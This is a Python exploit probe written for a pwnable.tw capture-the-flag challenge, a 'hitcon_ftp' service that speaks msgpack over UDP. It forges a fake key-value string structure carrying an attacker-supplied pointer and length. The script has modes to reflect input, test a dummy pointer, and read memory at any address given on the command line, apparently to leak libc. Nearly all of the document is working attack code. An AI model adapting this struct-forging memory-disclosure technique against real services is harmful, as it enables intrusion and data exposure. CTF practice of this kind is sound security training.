#!/usr/bin/env python3

import re
import socket
import struct
import sys

import msgpack


HOST = "chall.pwnable.tw"
TCP_PORT = 10309


def get_udp_port():
    io = socket.create_connection((HOST, TCP_PORT), timeout=5)
    banner = io.recv(128)
    m = re.search(rb"(\d+)", banner)
    if not m:
        raise RuntimeError(f"bad banner: {banner!r}")
    return io, int(m.group(1))


def make_udp(io):
    local_port = io.getsockname()[1]
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.bind(("0.0.0.0", local_port))
    s.settimeout(5)
    return s


def send_recv(pkt):
    io, udp_port = get_udp_port()
    s = make_udp(io)
    raw = msgpack.packb(pkt, use_bin_type=True)
    s.sendto(raw, (HOST, udp_port))
    data, peer = s.recvfrom(65535)
    try:
        obj = msgpack.unpackb(data, raw=False)
    except Exception:
        obj = None
    return {
        "banner_port": udp_port,
        "tcp_local_port": io.getsockname()[1],
        "udp_peer": peer,
        "raw": data,
        "obj": obj,
    }


def build_fake_kv_str(ptr, size, value):
    fake = bytearray(0x30)
    struct.pack_into("<I", fake, 0x00, 5)
    struct.pack_into("<Q", fake, 0x08, size)
    struct.pack_into("<Q", fake, 0x10, ptr)
    struct.pack_into("<I", fake, 0x18, 2)
    struct.pack_into("<Q", fake, 0x20, value)
    return bytes(fake)


def main():
    mode = sys.argv[1] if len(sys.argv) > 1 else "reflect"

    if mode == "reflect":
        pkt = [1, "hitcon_ftp", "octet", ["AAAA", 123], 0]
    elif mode == "bin0":
        pkt = [1, "hitcon_ftp", "octet", build_fake_kv_str(0x4141414141414141, 4, 0x4242), 0]
    elif mode == "libc":
        if len(sys.argv) < 3:
            raise SystemExit("usage: remote_probe.py libc <addr_hex> [size]")
        addr = int(sys.argv[2], 16)
        size = int(sys.argv[3], 0) if len(sys.argv) > 3 else 8
        pkt = [1, "hitcon_ftp", "octet", build_fake_kv_str(addr, size, 0x4141), 0]
    else:
        raise SystemExit(f"unknown mode: {mode}")

    res = send_recv(pkt)
    print("banner_port", res["banner_port"])
    print("tcp_local_port", res["tcp_local_port"])
    print("udp_peer", res["udp_peer"])
    print("raw_hex", res["raw"].hex())
    print("obj", repr(res["obj"]))


if __name__ == "__main__":
    main()
